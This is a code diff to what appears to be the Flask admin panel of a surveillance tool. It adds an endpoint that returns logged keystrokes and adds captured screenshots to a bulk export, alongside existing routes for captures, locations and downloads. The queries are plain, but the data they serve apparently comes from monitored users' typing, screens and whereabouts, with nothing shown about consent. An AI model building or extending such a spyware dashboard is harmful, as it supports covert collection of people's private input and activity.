@@ -267,6 +267,13 @@ def all_captures():
     rows = db.execute("SELECT * FROM captures ORDER BY id DESC LIMIT 500").fetchall()
     return jsonify([dict(r) for r in rows])
 
+@admin_bp.route("/keystrokes")
+@require_admin
+def keystrokes():
+    db = get_db()
+    rows = db.execute("SELECT * FROM keystrokes ORDER BY id DESC LIMIT 500").fetchall()
+    return jsonify({"success": True, "data": [dict(r) for r in rows]})
+
 @admin_bp.route("/locations")
 @require_admin
 def locations():
@@ -281,7 +288,8 @@ def all_data():
     db = get_db()
     downloads = db.execute("SELECT * FROM downloads ORDER BY id DESC LIMIT 500").fetchall()
     captures = db.execute("SELECT * FROM captures ORDER BY id DESC LIMIT 500").fetchall()
-    return jsonify({"downloads": [dict(r) for r in downloads], "captures": [dict(r) for r in captures]})
+    screenshots = db.execute("SELECT * FROM screenshots ORDER BY id DESC LIMIT 500").fetchall()
+    return jsonify({"downloads": [dict(r) for r in downloads], "captures": [dict(r) for r in captures], "screenshots": [dict(r) for r in screenshots]})
 
 @admin_bp.route("/captures/delete/<int:capture_id>", methods=["POST"])
 @require_admin
